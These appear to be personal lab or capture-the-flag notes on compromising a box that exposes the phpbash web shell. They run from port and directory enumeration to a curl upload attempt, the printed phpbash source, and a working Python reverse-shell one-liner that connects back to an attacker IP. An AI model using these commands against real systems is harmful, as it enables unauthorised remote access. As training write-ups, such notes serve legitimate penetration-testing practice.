port 80 is only thing open

Arrexel's Development Site -> http title
- This can be found from a github repo -> https://github.com/Arrexel/phpbash

no cgi-bin
apache 2.4.18 has a local priv esc -> linux/local/46676.php

looks like we can view directories
- images most recent upload date was 2017-12-04

Wierd Files:
- /php/sendMail.php
- /dev/phpbash.php

Looking at https://github.com/Arrexel/phpbash
- one of the issues is a xss

we see that that there is this line of code for file upload
`} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {`

curl -F 'path=/&file=@test.php' http://10.129.223.52/dev/phpbash.php

trying to send that didnt work, not sure if cause my stuff was wrong or what, but decided to read out the phpbash that was being used and saw
`<?php /* phpbash by Alexander Reid (Arrexel) */ if (ISSET($_POST['cmd'])) { echo shell_exec($_POST['cmd']." 2>&1"); die(); } ?>`

sudo tcpdump -i tun0 <-- good for testing ping backs
tried to wget a file, but couldnt write to that directory
always just go through a list of reverse shells, just cause one didnt work, doesnt mean another one couldnt

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.146", 6000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

sent that through and got a reverse shell